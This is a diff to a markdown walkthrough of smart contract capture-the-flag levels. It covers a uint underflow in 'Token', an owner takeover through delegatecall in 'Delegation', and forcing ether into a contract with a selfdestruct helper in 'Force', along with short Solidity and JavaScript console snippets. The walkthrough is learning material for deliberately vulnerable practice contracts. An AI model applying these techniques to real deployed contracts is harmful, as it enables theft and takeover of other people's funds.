@@ -167,7 +167,7 @@ This means that we can satisfy the condition `(tx.origin != msg.sender)` by sett
 
 ---
 
-### 5. Token
+### 6. Token
 
 Here we can hack the contract by exploiting the `uint` data type design. Since it is unsigned by definition, we cannot convert it into a negative number, then the `require` statement will always be satisfied no matter what positive value we send on the `_value` parameter.
 
@@ -199,7 +199,7 @@ await contract.balanceOf(player).then(Number);
 ```
 ---
 
-### 5. Delegation
+### 7. Delegation
 
 One important property of `delegatecall` is that executes other contractact's code in the context of the current contract.
 
@@ -223,3 +223,33 @@ And that's it! now let's check if works:
 ```JS
 await contract.owner().then(owner => owner === player);
 ```
+
+---
+
+### 8. Force
+
+Though the standard way to send ether to a Smart Contract is by using some `payable` function (such as the `receive` function), you can force any contract to receive ether in different ways.
+
+One way is by creating another contract that calls the `selfdestruct` keyword targeting to the contract we want to pay (setting the victim contract address as a parameter).
+
+```sol
+function takeMyMoney() public payable {
+  // self destructs the contract
+  // targeting to the victim contract
+  // in order to force its balance to increase.
+  selfdestruct(victimAddress);
+}
+```
+
+Then we can deploy [this contract](https://github.com/MCarlomagno/hackernaut/blob/main/contracts/Force.sol), instance it in a variable like `yourContract`, and then send some ether as follows:
+
+```js
+await yourContract.sendTransaction({ value: 1 });
+```
+
+And finally self-destroy it calling `takeMyMoney` function pointing to the instance contract address:
+
+```js
+await yourContract.takeMyMoney();
+```
+
